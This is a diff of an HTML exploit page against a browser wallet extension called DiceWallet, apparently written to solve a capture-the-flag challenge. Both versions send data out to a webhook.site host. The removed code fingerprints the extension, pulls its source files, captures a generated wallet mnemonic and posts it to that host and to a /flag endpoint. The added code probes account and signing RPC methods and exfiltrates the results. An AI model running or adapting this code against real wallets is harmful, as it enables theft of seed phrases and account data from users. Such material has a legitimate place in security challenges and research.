@@ -1,16 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DiceWallet Extension Exploit</title>
+    <title>DiceWallet Exploit v2</title>
 </head>
 <body>
-    <h1>DiceWallet Extension Exploit</h1>
+    <h1>DiceWallet Exploit</h1>
     <div id="status"></div>
     
     <script>
         const WEBHOOK_URL = 'https://e12d2551-e904-4c69-afb6-790abe2d8f6b.webhook.site';
-        let EXTENSION_URL = null;
-        let EXTENSION_ID = null;
         
         function log(msg) {
             document.getElementById('status').innerHTML += '<br>' + msg;
@@ -18,141 +16,26 @@
         }
         
         function sendToWebhook(data) {
-            const img = new Image();
-            img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(data))}`;
-        }
-        
-        // Tự động tìm extension URL từ script tags
-        function findExtensionUrl() {
-            const scripts = document.getElementsByTagName('script');
-            
-            for (let script of scripts) {
-                const src = script.src;
-                if (src && (src.startsWith('chrome-extension://') || src.startsWith('moz-extension://'))) {
-                    // Lấy phần base URL (cho tới dấu / cuối cùng)
-                    const lastSlash = src.lastIndexOf('/');
-                    EXTENSION_URL = src.substring(0, lastSlash + 1);
-                    
-                    // Lấy extension ID (phần giữa // và / tiếp theo)
-                    const match = src.match(/(?:chrome-extension|moz-extension):\/\/([^\/]+)/);
-                    if (match) {
-                        EXTENSION_ID = match[1];
-                    }
-                    
-                    log(`✅ Found extension: ${EXTENSION_URL}`);
-                    log(`✅ Extension ID: ${EXTENSION_ID}`);
-                    
-                    sendToWebhook({ 
-                        type: 'extension_detected', 
-                        url: EXTENSION_URL,
-                        id: EXTENSION_ID,
-                        browser: src.startsWith('moz-') ? 'firefox' : 'chrome'
-                    });
-                    
-                    return true;
-                }
-            }
-            
-            log('❌ No extension script found');
-            return false;
-        }
-        
-        async function fetchExtensionFile(filename) {
-            if (!EXTENSION_URL) {
-                log(`❌ No extension URL for ${filename}`);
-                return null;
-            }
-            
-            try {
-                const url = `${EXTENSION_URL}${filename}`;
-                log(`Fetching ${url}...`);
-                
-                const response = await fetch(url);
-                if (!response.ok) {
-                    throw new Error(`HTTP ${response.status}`);
-                }
-                
-                const content = await response.text();
-                log(`✅ Got ${filename} (${content.length} bytes)`);
-                
-                sendToWebhook({
-                    type: 'extension_file',
-                    file: filename,
-                    content: content.substring(0, 10000)
-                });
-                
-                return content;
-            } catch (e) {
-                log(`❌ Cannot fetch ${filename}: ${e.message}`);
-                sendToWebhook({
-                    type: 'extension_file_error',
-                    file: filename,
-                    error: e.message
-                });
-                return null;
-            }
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(() => {
+                // Fallback to image if fetch fails
+                new Image().src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(data))}`;
+            });
         }
         
         async function exploit() {
-            log('0. Starting exploit...');
-            
-            // Bước 1: Tìm extension URL
-            log('1. Scanning for extension URL...');
-            if (!findExtensionUrl()) {
-                // Thử đợi và scan lại sau
-                log('Waiting 2 seconds and scan again...');
-                await new Promise(r => setTimeout(r, 2000));
-                findExtensionUrl();
-            }
-            
-            // Bước 2: Fetch các file của extension
-            if (EXTENSION_URL) {
-                log('2. Fetching extension files...');
-                
-                const files = [
-                    'manifest.json',
-                    'popup.html',
-                    'popup.js',
-                    'background.js',
-                    'inpage.js',
-                    'content.js',
-                    'styles.css'
-                ];
-                
-                for (const file of files) {
-                    await fetchExtensionFile(file);
-                    await new Promise(r => setTimeout(r, 300));
-                }
-            } else {
-                log('❌ Cannot fetch files - no extension URL');
-            }
-            
-            // Bước 3: Đợi ethereum provider
-            log('3. Waiting for ethereum provider...');
+            log('1. Waiting for ethereum provider...');
             
             await new Promise(resolve => {
-                if (window.ethereum && window.ethereum.isDiceWallet) {
-                    log('ethereum already available');
+                if (window.ethereum) {
                     resolve();
                 } else {
-                    window.addEventListener('dwOnReady', () => {
-                        log('dwOnReady fired!');
-                        resolve();
-                    }, { once: true });
-                    
-                    // Polling fallback
-                    let attempts = 0;
-                    const interval = setInterval(() => {
-                        if (window.ethereum) {
-                            log('ethereum available via polling');
-                            clearInterval(interval);
-                            resolve();
-                        }
-                        if (++attempts > 15) {
-                            log('❌ Timeout waiting for ethereum');
-                            clearInterval(interval);
-                        }
-                    }, 1000);
+                    window.addEventListener('dwOnReady', resolve, { once: true });
+                    setTimeout(resolve, 5000);
                 }
             });
             
@@ -161,106 +44,67 @@
                 return;
             }
             
-            log('4. Ethereum provider ready!');
+            log('2. Ethereum provider ready!');
             
-            // Bước 4: Lấy thông tin provider
-            const providerInfo = {
-                isDiceWallet: window.ethereum.isDiceWallet,
-                isMetaMask: window.ethereum.isMetaMask,
-                chainId: window.ethereum.chainId,
-                networkVersion: window.ethereum.networkVersion,
-                selectedAddress: window.ethereum.selectedAddress
-            };
-            log('Provider info:', providerInfo);
-            sendToWebhook({ type: 'provider_info', info: providerInfo });
-            
-            // Bước 5: Test các methods
-            log('5. Testing RPC methods...');
-            
+            // Danh sách methods cần test
             const methods = [
+                // Basic
                 'eth_chainId',
                 'eth_accounts',
                 'net_version',
                 'eth_blockNumber',
-                'wallet_getState'
+                
+                // Wallet specific
+                'wallet_getState',
+                'wallet_getAccounts',
+                'wallet_getCurrentAccount',
+                
+                // Try to get info without allowed origin
+                'personal_sign',
+                'eth_sign',
+                'eth_signTypedData',
+                'eth_signTypedData_v3',
+                'eth_signTypedData_v4',
+                
+                // Maybe these work?
+                'wallet_exportPublicKey',
+                'wallet_exportAddress',
+                'wallet_getBalance'
             ];
+            
+            log('3. Testing methods...');
             
             for (const method of methods) {
                 try {
                     log(`Testing ${method}...`);
                     const result = await window.ethereum.request({ method });
                     log(`✅ ${method}:`, result);
-                    sendToWebhook({ type: 'method_result', method, result });
+                    
+                    sendToWebhook({
+                        type: 'method_success',
+                        method,
+                        result
+                    });
+                    
                 } catch (e) {
                     log(`❌ ${method}: ${e.message}`);
-                    sendToWebhook({ type: 'method_error', method, error: e.message });
-                }
-            }
-            
-            // Bước 6: Thử wallet_generate
-            try {
-                log('6. Testing wallet_generate...');
-                const result = await window.ethereum.request({ 
-                    method: 'wallet_generate' 
-                });
-                log('✅ wallet_generate:', result);
-                sendToWebhook({ type: 'wallet_generate', result });
-                
-                // Nếu có mnemonic, thử gửi flag
-                if (result && result.mnemonic) {
-                    log('🎯 Got mnemonic!');
                     
-                    // Gửi về webhook
-                    sendToWebhook({ 
-                        type: 'mnemonic_captured', 
-                        mnemonic: result.mnemonic,
-                        address: result.address 
-                    });
-                    
-                    // Thử gửi lên /flag
-                    try {
-                        const flagRes = await fetch('/flag', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ mnemonic: result.mnemonic })
-                        });
-                        
-                        const flagData = await flagRes.json();
-                        log('Flag response:', flagData);
-                        sendToWebhook({ type: 'flag_response', data: flagData });
-                        
-                        if (flagData.flag) {
-                            log(`🏁 FLAG: ${flagData.flag}`);
-                            document.getElementById('status').innerHTML += `<br><br><strong style="color:red">🏁 FLAG: ${flagData.flag}</strong>`;
-                        }
-                        
-                    } catch (flagError) {
-                        log(`❌ Flag submit error: ${flagError.message}`);
-                    }
-                }
-                
-            } catch (e) {
-                log(`❌ wallet_generate: ${e.message}`);
-                sendToWebhook({ type: 'wallet_generate_error', error: e.message });
-                
-                // Nếu lỗi "Origin not allowed", gửi origin
-                if (e.message.includes('Origin not allowed')) {
-                    sendToWebhook({ 
-                        type: 'origin_not_allowed', 
-                        origin: window.location.origin 
+                    sendToWebhook({
+                        type: 'method_error',
+                        method,
+                        error: e.message
                     });
                 }
+                
+                // Delay giữa các request
+                await new Promise(r => setTimeout(r, 500));
             }
             
             log('=== Exploit Complete ===');
         }
         
-        // Start khi DOM ready
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', exploit);
-        } else {
-            exploit();
-        }
+        log('0. Starting exploit...');
+        exploit();
     </script>
 </body>
 </html>
